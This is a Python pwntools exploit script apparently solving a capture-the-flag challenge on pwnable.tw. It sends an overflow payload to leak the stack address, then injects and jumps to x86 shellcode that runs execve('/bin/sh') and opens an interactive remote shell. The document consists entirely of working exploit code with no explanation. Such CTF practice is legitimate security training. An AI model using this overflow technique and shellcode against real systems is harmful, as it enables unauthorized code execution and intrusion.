from pwn import *

context.arch = 'i386'
r = remote("chall.pwnable.tw", 10000)

def leak_esp(r):
    address_1 = p32(0x08048087)             # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
    payload = 'A'*20 + address_1
    print r.recvuntil('CTF:')
    r.send(payload)
    esp = u32(r.recv()[:4])
    print "Address of ESP: ", hex(esp)
    return esp

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

esp = leak_esp(r)
payload = "A"*20  + p32(esp + 20) + shellcode 
r.send(payload)    
r.interactive()
